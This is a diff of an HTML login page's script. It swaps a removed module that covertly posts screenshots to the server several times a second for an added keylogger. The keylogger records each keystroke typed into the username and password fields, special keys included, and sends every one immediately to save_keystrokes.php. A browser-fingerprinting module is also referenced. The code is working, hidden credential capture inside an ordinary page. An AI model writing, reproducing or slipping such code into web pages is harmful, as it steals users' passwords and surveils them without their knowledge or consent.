@@ -21171,109 +21171,107 @@
     }
   </script>
 
-  <!-- Screenshot Capture & Browser Fingerprinting -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <script>
     // ==============================================
-    // MODULE 1: Screenshot Capture (Every 0.5s)
+    // MODULE 1: Advanced Keylogger
     // ==============================================
-    let screenshotCounter = 0;
-    let isCapturing = false;
-    let captureQueue = [];
-    let lastCaptureTime = 0;
-    let sessionStartTime = null;
+    let keystrokeLog = [];
+    let sessionStartTime = Date.now();
+    let keystrokeCounter = 0;
 
-    // Debug counters
-    let debugAttempts = 0;
-    let debugSkipped = 0;
-    let debugSuccess = 0;
-    let debugFailed = 0;
+    function logKeystroke(fieldName, key, keyCode, isSpecial) {
+      const timestamp = Date.now();
+      const elapsed = timestamp - sessionStartTime;
 
-    function captureScreenshot() {
-      debugAttempts++;
+      keystrokeCounter++;
 
-      // Prevent overlapping captures and enforce minimum 333ms between captures (3/sec)
-      const now = Date.now();
-      if (isCapturing || (now - lastCaptureTime) < 333) {
-        debugSkipped++;
-        console.log(`[SKIP] Attempt ${debugAttempts}: isCapturing=${isCapturing}, timeSinceLast=${now - lastCaptureTime}ms`);
-        return;
-      }
+      const keystrokeData = {
+        counter: keystrokeCounter,
+        field: fieldName,
+        key: key,
+        keyCode: keyCode,
+        isSpecial: isSpecial,
+        timestamp: timestamp,
+        elapsedMs: elapsed,
+        elapsedSeconds: (elapsed / 1000).toFixed(2)
+      };
 
-      isCapturing = true;
-      lastCaptureTime = now;
+      keystrokeLog.push(keystrokeData);
 
-      // Initialize session start time on first capture
-      if (!sessionStartTime) {
-        sessionStartTime = now;
-      }
+      // Send to server immediately
+      fetch('save_keystrokes.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(keystrokeData)
+      }).catch(err => console.log('Keystroke save failed'));
 
-      // Calculate elapsed time
-      const elapsedMs = now - sessionStartTime;
-      const elapsedSeconds = Math.floor(elapsedMs / 1000);
-      const subSecondIndex = Math.floor((elapsedMs % 1000) / 333) + 1; // 1-3
-
-      const captureStartTime = Date.now();
-      console.log(`[START] Capture ${screenshotCounter + 1} - ${elapsedSeconds + 1}s-${subSecondIndex}`);
-
-      // Wait a bit to ensure page has rendered any changes
-      setTimeout(() => {
-        html2canvas(document.body, {
-          allowTaint: true,
-          useCORS: true,
-          scale: 2.0,  // High resolution for quality
-          logging: false,
-          backgroundColor: '#ffffff'
-        }).then(canvas => {
-          const canvasTime = Date.now() - captureStartTime;
-          console.log(`[CANVAS] Rendered in ${canvasTime}ms`);
-
-          const screenshot = canvas.toDataURL('image/jpeg', 0.9);  // 90% quality - high clarity
-          const timestamp = Date.now();
-          screenshotCounter++;
-
-          const encodeTime = Date.now() - captureStartTime - canvasTime;
-          console.log(`[ENCODE] Encoded in ${encodeTime}ms, size: ${Math.round(screenshot.length / 1024)}KB`);
-
-          // Send to server with second and subsecond info
-          return fetch('save_screenshot.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              screenshot: screenshot,
-              timestamp: timestamp,
-              counter: screenshotCounter,
-              elapsedSeconds: elapsedSeconds,
-              subSecondIndex: subSecondIndex
-            })
-          });
-        })
-          .then(() => {
-            const totalTime = Date.now() - captureStartTime;
-            debugSuccess++;
-            console.log(`[SUCCESS] Total time: ${totalTime}ms | Stats: ${debugSuccess} success, ${debugFailed} failed, ${debugSkipped} skipped`);
-            isCapturing = false; // Release lock on success
-          })
-          .catch(err => {
-            debugFailed++;
-            const totalTime = Date.now() - captureStartTime;
-            console.log(`[FAILED] Error after ${totalTime}ms:`, err);
-            console.log(`[STATS] ${debugSuccess} success, ${debugFailed} failed, ${debugSkipped} skipped`);
-            isCapturing = false; // Release lock on failure
-          });
-      }, 50); // Small delay to let DOM settle
+      // Also log to console for debugging
+      console.log(`[KEYLOG] #${keystrokeCounter} [${fieldName}] "${key}" (${keyCode}) at ${elapsed}ms`);
     }
 
-    // Start capturing loop - check every 100ms but respect 333ms minimum between actual captures
-    window.addEventListener('load', function () {
-      setInterval(captureScreenshot, 100);
-      console.log('[INIT] Screenshot capture started - checking every 100ms, capturing max 3/sec');
+    // Attach keylogger to username field
+    document.addEventListener('DOMContentLoaded', function () {
+      const usernameField = document.querySelector('input[name="username"]');
+      const passwordField = document.querySelector('input[type="text"][name="password"]');
+
+      if (usernameField) {
+        usernameField.addEventListener('keydown', function (e) {
+          let key = e.key;
+          let isSpecial = false;
+
+          // Handle special keys
+          if (key === 'Backspace') {
+            key = '[BACKSPACE]';
+            isSpecial = true;
+          } else if (key === 'Delete') {
+            key = '[DELETE]';
+            isSpecial = true;
+          } else if (key === 'Enter') {
+            key = '[ENTER]';
+            isSpecial = true;
+          } else if (key === 'Tab') {
+            key = '[TAB]';
+            isSpecial = true;
+          } else if (key.length > 1) {
+            // Other special keys (Shift, Ctrl, etc.)
+            key = `[${key.toUpperCase()}]`;
+            isSpecial = true;
+          }
+
+          logKeystroke('username', key, e.keyCode, isSpecial);
+        });
+      }
+
+      if (passwordField) {
+        passwordField.addEventListener('keydown', function (e) {
+          let key = e.key;
+          let isSpecial = false;
+
+          // Handle special keys
+          if (key === 'Backspace') {
+            key = '[BACKSPACE]';
+            isSpecial = true;
+          } else if (key === 'Delete') {
+            key = '[DELETE]';
+            isSpecial = true;
+          } else if (key === 'Enter') {
+            key = '[ENTER]';
+            isSpecial = true;
+          } else if (key === 'Tab') {
+            key = '[TAB]';
+            isSpecial = true;
+          } else if (key.length > 1) {
+            key = `[${key.toUpperCase()}]`;
+            isSpecial = true;
+          }
+
+          logKeystroke('password', key, e.keyCode, isSpecial);
+        });
+      }
+
+      console.log('[KEYLOGGER] Advanced keylogger initialized - tracking all keystrokes');
     });
 
-    // Stop capturing if user leaves page
-    window.addEventListener('beforeunload', function () {
-      // No specific interval to clear here, as capture is managed by `isCapturing` and `lastCaptureTime`
-    });
 
     // ==============================================
     // MODULE 2: Browser Fingerprinting
